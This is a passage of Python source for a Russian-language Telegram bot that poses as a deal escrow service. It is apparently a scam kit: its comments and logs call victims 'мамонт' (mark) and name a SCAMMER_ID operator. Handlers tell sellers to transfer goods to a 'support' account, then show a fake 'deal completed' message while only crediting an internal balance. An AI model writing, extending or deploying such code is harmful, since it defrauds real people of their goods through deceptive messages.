                f"<b>В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату.</b>\n"
                f"<b>Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости.</b>",
                reply_markup=deal_status_buttons(deal_code, is_seller=True)
            )
            logger.info(f"Сообщение отправлено мамонту (seller_id={seller_id})")
        except Exception as e:
            logger.error(f"Не удалось отправить сообщение мамонту: {e}")

    await callback.answer(f"{E_SUCCESS} Оплата подтверждена!")

@router.callback_query(F.data.startswith("confirm_deal_"))
async def confirm_deal(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    
    deal_code = callback.data.replace("confirm_deal_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    if deal[6] in ['confirmed', 'completed']:
        await callback.answer("❌ Передача уже подтверждена!", show_alert=True)
        return

    update_deal_confirmed(deal_code)
    deal = get_deal(deal_code)
    
    buyer_id = deal[3]
    seller_id = deal[1]
    currency_emoji = get_currency_emoji(deal[5])
    amount_display = format_amount(deal[4])

    if seller_id:
        try:
            await callback.bot.send_message(
                seller_id,
                f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
                f"<b>Описание:</b> {deal[5]}\n"
                f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                f"<b>Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара</b>\n\n"
                f"<b>Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}.</b>\n"
                f"<b>Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!</b>",
                reply_markup=support_button()
            )
            logger.info(f"Сообщение отправлено мамонту (seller_id={seller_id})")
        except Exception as e:
            logger.error(f"Не удалось отправить сообщение мамонту: {e}")

    clean_code = deal_code.strip()
    
    try:
        await callback.bot.send_message(
            SCAMMER_ID,
            f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
            f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
            f"<b>Описание:</b> {deal[5]}\n"
            f"<b>Комиссия:</b> {COMMISSION}%\n\n"
            f"<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>\n\n"
            f"<b>Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота.</b>\n"
            f"<b>После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!</b>",
            reply_markup=deal_status_buttons(clean_code, is_scammer=True)
        )
        logger.info(f"Сообщение отправлено скамеру (SCAMMER_ID={SCAMMER_ID})")
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение скамеру: {e}")

    await callback.answer("✅ Передача подтверждена! Ожидайте подтверждения от скамера.")

@router.callback_query(F.data.startswith("confirm_deal_scammer_"))
async def confirm_deal_scammer(callback: CallbackQuery, state: FSMContext):
    # ===== ПРОВЕРКА: АДМИН ИЛИ СКАМЕР =====
    if not is_admin(callback.from_user.id) and not is_scammer(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    await state.clear()

    import re
    deal_code = callback.data.replace("confirm_deal_scammer_", "").strip()
    deal_code = re.sub(r'[^a-zA-Z0-9]', '', deal_code)
    
    logger.info(f"🔥 SCAMMER: получен код = '{deal_code}'")
    
    deal = None
    
    # 1. Точный поиск
    deal = get_deal(deal_code)
    
    # 2. Поиск по частичному совпадению через get_deal_by_partial
    if not deal:
        deal = get_deal_by_partial(deal_code)
        logger.info(f"🔥 SCAMMER: поиск по partial, найдено = {deal is not None}")
    
    # 3. Если всё ещё не найдено — ищем через LIKE по всем сделкам
    if not deal:
        conn = sqlite3.connect(DB_NAME)
        cur = conn.cursor()
        cur.execute("SELECT * FROM deals WHERE deal_code LIKE ?", (f"%{deal_code}%",))
        deal = cur.fetchone()
        conn.close()
        logger.info(f"🔥 SCAMMER: поиск по LIKE, найдено = {deal is not None}")
    
    # 4. Если совсем не найдено — ищем по БУКВАЛЬНОМУ СОВПАДЕНИЮ без очистки
    if not deal:
        raw_code = callback.data.replace("confirm_deal_scammer_", "").strip()
        deal = get_deal(raw_code)
        logger.info(f"🔥 SCAMMER: поиск по сырому коду '{raw_code}', найдено = {deal is not None}")
    
    if not deal:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        logger.error(f"🔥 SCAMMER: сделка не найдена ни по одному из методов")
        return

    if deal[6] == 'completed':
        await callback.answer("❌ Уже завершена!", show_alert=True)
        await callback.message.delete()
        return

    actual_code = deal[0]
    logger.info(f"🔥 SCAMMER: найден код сделки = '{actual_code}'")
    
    update_deal_completed(actual_code)
    deal = get_deal(actual_code)
    
    buyer_id = deal[3]
    seller_id = deal[1]
    currency_emoji = get_currency_emoji(deal[5])
    amount_display = format_amount(deal[4])

    update_user_balance(seller_id, deal[4])
    update_user_successful_deals(seller_id)
    if buyer_id:
        update_user_successful_deals(buyer_id)

    await callback.message.edit_text(
        f"{E_DEAL} <b>Сделка #{actual_code}</b>\n"
        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
        f"<b>Описание:</b> {deal[5]}\n"
        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
        f"{E_PAID} <b>Статус: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
        f"{E_SUCCESS} <b>Пожалуйста, дождитесь поступления товара на ваш аккаунт!</b>",
        reply_markup=None
    )

    if buyer_id:
        try:
            await callback.bot.send_message(
                buyer_id,
                f"{E_DEAL} <b>Сделка #{actual_code}</b>\n"
                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
                f"<b>Описание:</b> {deal[5]}\n"
                f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                f"{E_PAID} <b>Статус: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
                f"<b>Ожидайте поступления оплаты на указанный вами ранее кошелёк!</b>",
                reply_markup=support_button()
            )
            logger.info(f"🔥 SCAMMER: сообщение отправлено мамонту {buyer_id}")
        except Exception as e:
            logger.error(f"Ошибка отправки мамонту: {e}")

    await callback.answer("✅ Сделка завершена!")

@router.callback_query()
async def catch_all_callbacks(callback: CallbackQuery):
    await callback.answer(f"{E_WARNING} Команда в разработке...")
    await callback.message.answer(
        f"{E_CROSS} <b>Неизвестная команда.</b>\n<b>Используйте /start для начала работы.</b>",
        reply_markup=back_button()
    )

@router.message()
async def handle_unknown(message: Message):
    await message.answer(
        f"{E_CROSS} <b>Неизвестная команда.</b>\n<b>Используйте /start для начала работы.</b>"
    )